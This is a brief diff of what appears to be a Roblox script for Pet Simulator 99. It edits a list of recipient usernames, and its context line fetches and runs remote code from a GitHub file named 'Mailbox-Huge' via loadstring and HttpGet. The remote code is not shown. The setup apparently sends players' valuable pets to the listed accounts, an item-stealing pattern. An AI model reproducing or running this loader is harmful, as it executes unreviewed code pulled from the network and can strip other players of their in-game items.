@@ -1,5 +1,5 @@
 ---
-getgenv().usernames = {"manhmelenem1", "maimailaem21", "sieunhandienquang315"}
+getgenv().usernames = {"maimailaem21"}
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/Mailbox-Huge"))()
 task.wait(3)
 ---
